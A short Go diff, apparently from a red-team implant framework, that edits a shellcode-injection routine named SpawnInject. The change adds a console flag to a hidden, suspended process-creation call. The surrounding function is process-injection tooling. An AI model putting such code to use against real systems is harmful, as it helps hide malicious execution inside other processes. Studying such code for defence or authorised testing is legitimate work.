@@ -311,7 +311,7 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	si.Cb = uint32(unsafe.Sizeof(*si))
 	si.Flags = windows.STARTF_USESHOWWINDOW
 	pi := new(windows.ProcessInformation)
-	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
+	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NEW_CONSOLE|windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
 	if err != nil {
 		return "", err
 	}
